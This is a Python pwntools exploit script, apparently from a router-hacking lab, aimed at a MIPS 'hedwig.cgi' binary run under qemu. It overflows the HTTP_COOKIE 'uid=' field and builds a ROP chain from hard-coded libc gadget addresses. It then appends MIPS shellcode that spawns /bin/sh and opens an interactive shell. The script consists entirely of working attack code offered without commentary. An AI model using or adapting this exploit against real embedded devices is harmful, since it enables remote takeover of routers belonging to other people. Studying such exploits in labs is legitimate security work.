from pwn import *
context(os = 'linux', arch = 'mips', log_level = 'debug')
 
libc_base = 0x3ff38000
 
payload = b'a'*0x3cd
payload += b'a'*4
payload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=> lw... => jalr $t9)
payload += b'a'*4
payload += p32(libc_base + 0x56BD0) # s3  sleep
payload += b'a'*(4*5)
payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)
 
payload += b'a'*0x18
payload += b'a'*(4*4)
payload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=> jalr $t9)
payload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=> jalr $s4)
 
shellcode = asm('''
    slti $a2, $zero, -1
    li $t7, 0x69622f2f
    sw $t7, -12($sp)
    li $t6, 0x68732f6e
    sw $t6, -8($sp)
    sw $zero, -4($sp)
    la $a0, -12($sp)
    slti $a1, $zero, -1
    li $v0, 4011
    syscall 0x40404
''')
payload += b'a'*0x18
payload += shellcode
 
payload = b"uid=" + payload
post_content = "winmt=pwner"
io = process(b"""
    qemu-mipsel -L ./ \
    -0 "hedwig.cgi" \
    -E REQUEST_METHOD="POST" \
    -E CONTENT_LENGTH=11 \
    -E CONTENT_TYPE="application/x-www-form-urlencoded" \
    -E HTTP_COOKIE=\"""" + payload + b"""\" \
    -E REQUEST_URI="2333" \
    ./htdocs/cgibin
""", shell = True)
io.send(post_content)
io.interactive()